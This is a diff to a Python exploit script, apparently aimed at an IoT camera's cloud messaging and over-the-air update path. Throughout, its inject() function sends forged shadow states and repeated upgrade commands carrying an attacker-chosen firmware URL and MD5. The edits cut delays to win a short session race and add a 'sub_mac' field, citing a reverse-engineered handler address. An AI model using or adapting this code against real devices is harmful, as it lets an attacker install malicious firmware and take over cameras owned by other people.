@@ -217,7 +217,7 @@ def _live():
     return c
 
 def inject(cli, up=None):
-    time.sleep(2)   # the pair can close within seconds; do not outwait the session
+    time.sleep(0.5)  # the pair can close within seconds; do not outwait the session
     if not MD5:
         print("inject: OTA_MD5 unset",flush=True); return
     st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":MODEL,"sub_mac":THING.upper()},"reported":{}},"version":999}
@@ -233,7 +233,7 @@ def inject(cli, up=None):
             print("inject delta retry",repr(e),flush=True); time.sleep(2)
     else:
         print("inject: delta gave up",flush=True); return
-    time.sleep(3)
+    time.sleep(0.5)
     models=[m for m in os.environ.get("OTA_MODELS","").split(",") if m] or [MODEL]
     for i in range(20):
         m=models[i % len(models)]
@@ -242,13 +242,15 @@ def inject(cli, up=None):
         acts=[a for a in os.environ.get("OTA_ACTIONS","").split(",") if a] or ["upgrade"]
         act=acts[i % len(acts)]
         ver=URL.rsplit("/",1)[-1].split(".tar")[0]
-        inner={"model":m,"url":URL,"firmware_ver":ver,"md5":MD5}
+        # sub_mac is mandatory: the handler at iCamera:0x476e98 dereferences it after starting
+        # the worker (ota-path.md 9.5), and the UDS receiver wants it top-level as well.
+        inner={"model":m,"url":URL,"firmware_ver":ver,"md5":MD5,"sub_mac":THING.upper()}
         if act == "upgrade":
-            body={"Action":"upgrade","Params":inner,
+            body={"Action":"upgrade","Params":inner,"sub_mac":THING.upper(),
                   "Guid":os.urandom(8).hex(),"Ts":int(time.time()*1000)}
         elif act == "cmd":
             # iotclient logs "cmd:%d, len:%d, data:%s" and builds the UDS message itself
-            body={"cmd":1234,"data":inner}
+            body={"cmd":1234,"sub_mac":THING.upper(),"data":inner}
         elif act == "cmdstr":
             body={"cmd":1234,"data":json.dumps(inner)}
         elif act == "upgradeSub":
@@ -312,7 +314,7 @@ def inject(cli, up=None):
                 print("inject cmd retry",repr(e),flush=True); time.sleep(2)
         else:
             print("inject cmd gave up",_t.strftime("%H:%M:%S"),flush=True); return
-        time.sleep(4)
+        time.sleep(1)   # the pair dies in seconds; do not spend 4 s between variants
 
 LIVE={"c":None}
 WLOCK=threading.Lock()  # SSLSocket.sendall is not thread-safe; the S pipe and the injector both write
